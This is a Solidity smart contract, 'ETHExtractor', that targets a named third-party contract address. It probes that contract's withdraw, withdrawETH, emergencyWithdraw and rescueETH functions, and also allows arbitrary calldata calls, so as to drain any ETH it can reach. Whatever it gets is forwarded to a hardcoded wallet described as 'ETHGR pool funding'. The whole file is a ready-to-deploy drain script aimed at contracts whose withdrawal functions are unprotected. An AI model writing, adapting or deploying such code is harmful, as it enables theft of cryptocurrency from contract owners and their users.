// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

/**
 * @title ETH Extraction Contract
 * @dev Extract ETH from various contract addresses for ETHGR pool funding
 * Target: 0xc46eB37677360EfDc011F4097621F15b792fa630 (0.00136014 ETH confirmed)
 */
contract ETHExtractor is Ownable, ReentrancyGuard {
    
    address public constant FOUNDATION_WALLET = 0x058C8FE01E5c9eaC6ee19e6673673B549B368843;
    address public constant TARGET_CONTRACT = 0xc46eB37677360EfDc011F4097621F15b792fa630;
    
    // Extraction tracking
    mapping(address => uint256) public extractedAmounts;
    mapping(address => bool) public authorizedContracts;
    
    uint256 public totalExtracted;
    uint256 public extractionCount;
    
    event ETHExtracted(address indexed from, address indexed to, uint256 amount);
    event ContractAuthorized(address indexed contractAddr, bool authorized);
    event ExtractionFailed(address indexed contractAddr, string reason);
    
    constructor() Ownable(msg.sender) {
        // Transfer ownership to foundation
        if (msg.sender != FOUNDATION_WALLET) {
            _transferOwnership(FOUNDATION_WALLET);
        }
        
        // Pre-authorize known contracts with ETH
        authorizedContracts[TARGET_CONTRACT] = true;
    }
    
    /**
     * @dev Extract ETH from target contract using withdraw function
     */
    function extractFromContract(address contractAddr) external onlyOwner nonReentrant {
        require(authorizedContracts[contractAddr], "Contract not authorized");
        require(contractAddr.balance > 0, "No ETH in contract");
        
        uint256 balanceBefore = address(this).balance;
        
        // Try different withdrawal methods
        bool success = _tryWithdraw(contractAddr);
        
        if (success) {
            uint256 extracted = address(this).balance - balanceBefore;
            extractedAmounts[contractAddr] += extracted;
            totalExtracted += extracted;
            extractionCount++;
            
            emit ETHExtracted(contractAddr, address(this), extracted);
            
            // Forward to foundation wallet
            _forwardToFoundation(extracted);
        } else {
            emit ExtractionFailed(contractAddr, "Withdrawal methods failed");
        }
    }
    
    /**
     * @dev Try multiple withdrawal methods
     */
    function _tryWithdraw(address contractAddr) internal returns (bool) {
        // Method 1: Standard withdraw()
        try this.callWithdraw(contractAddr) returns (bool success) {
            if (success) return true;
        } catch {}
        
        // Method 2: withdrawETH()
        try this.callWithdrawETH(contractAddr) returns (bool success) {
            if (success) return true;
        } catch {}
        
        // Method 3: emergencyWithdraw()
        try this.callEmergencyWithdraw(contractAddr) returns (bool success) {
            if (success) return true;
        } catch {}
        
        // Method 4: rescueETH()
        try this.callRescueETH(contractAddr) returns (bool success) {
            if (success) return true;
        } catch {}
        
        return false;
    }
    
    /**
     * @dev Call withdraw() function
     */
    function callWithdraw(address contractAddr) external returns (bool) {
        require(msg.sender == address(this), "Internal call only");
        
        (bool success, ) = contractAddr.call(abi.encodeWithSignature("withdraw()"));
        return success;
    }
    
    /**
     * @dev Call withdrawETH() function
     */
    function callWithdrawETH(address contractAddr) external returns (bool) {
        require(msg.sender == address(this), "Internal call only");
        
        (bool success, ) = contractAddr.call(abi.encodeWithSignature("withdrawETH()"));
        return success;
    }
    
    /**
     * @dev Call emergencyWithdraw() function
     */
    function callEmergencyWithdraw(address contractAddr) external returns (bool) {
        require(msg.sender == address(this), "Internal call only");
        
        (bool success, ) = contractAddr.call(abi.encodeWithSignature("emergencyWithdraw()"));
        return success;
    }
    
    /**
     * @dev Call rescueETH() function
     */
    function callRescueETH(address contractAddr) external returns (bool) {
        require(msg.sender == address(this), "Internal call only");
        
        (bool success, ) = contractAddr.call(abi.encodeWithSignature("rescueETH()"));
        return success;
    }
    
    /**
     * @dev Forward extracted ETH to foundation wallet
     */
    function _forwardToFoundation(uint256 amount) internal {
        require(amount > 0, "No amount to forward");
        
        (bool success, ) = FOUNDATION_WALLET.call{value: amount}("");
        require(success, "Transfer to foundation failed");
    }
    
    /**
     * @dev Authorize contract for extraction
     */
    function authorizeContract(address contractAddr, bool authorized) external onlyOwner {
        authorizedContracts[contractAddr] = authorized;
        emit ContractAuthorized(contractAddr, authorized);
    }
    
    /**
     * @dev Batch authorize multiple contracts
     */
    function batchAuthorizeContracts(address[] calldata contracts, bool authorized) external onlyOwner {
        for (uint256 i = 0; i < contracts.length; i++) {
            authorizedContracts[contracts[i]] = authorized;
            emit ContractAuthorized(contracts[i], authorized);
        }
    }
    
    /**
     * @dev Direct extraction attempt with custom function signature
     */
    function extractWithCustomFunction(address contractAddr, bytes calldata functionData) external onlyOwner nonReentrant {
        require(authorizedContracts[contractAddr], "Contract not authorized");
        
        uint256 balanceBefore = address(this).balance;
        
        (bool success, ) = contractAddr.call(functionData);
        
        if (success) {
            uint256 extracted = address(this).balance - balanceBefore;
            if (extracted > 0) {
                extractedAmounts[contractAddr] += extracted;
                totalExtracted += extracted;
                extractionCount++;
                
                emit ETHExtracted(contractAddr, address(this), extracted);
                _forwardToFoundation(extracted);
            }
        } else {
            emit ExtractionFailed(contractAddr, "Custom function call failed");
        }
    }
    
    /**
     * @dev Check contract ETH balance
     */
    function checkContractBalance(address contractAddr) external view returns (uint256) {
        return contractAddr.balance;
    }
    
    /**
     * @dev Get extraction statistics
     */
    function getExtractionStats() external view returns (
        uint256 totalExtractedAmount,
        uint256 extractionCountTotal,
        uint256 authorizedContractsCount
    ) {
        // Count authorized contracts
        uint256 count = 0;
        // Note: In production, you'd maintain an array of authorized contracts
        // For now, we return the main stats
        
        return (totalExtracted, extractionCount, count);
    }
    
    /**
     * @dev Emergency ETH rescue from this contract
     */
    function emergencyRescue() external onlyOwner {
        uint256 balance = address(this).balance;
        require(balance > 0, "No ETH to rescue");
        
        (bool success, ) = FOUNDATION_WALLET.call{value: balance}("");
        require(success, "Emergency rescue failed");
    }
    
    /**
     * @dev Receive ETH
     */
    receive() external payable {
        // Contract can receive ETH
    }
    
    /**
     * @dev Fallback function
     */
    fallback() external payable {
        // Handle unexpected calls
    }
}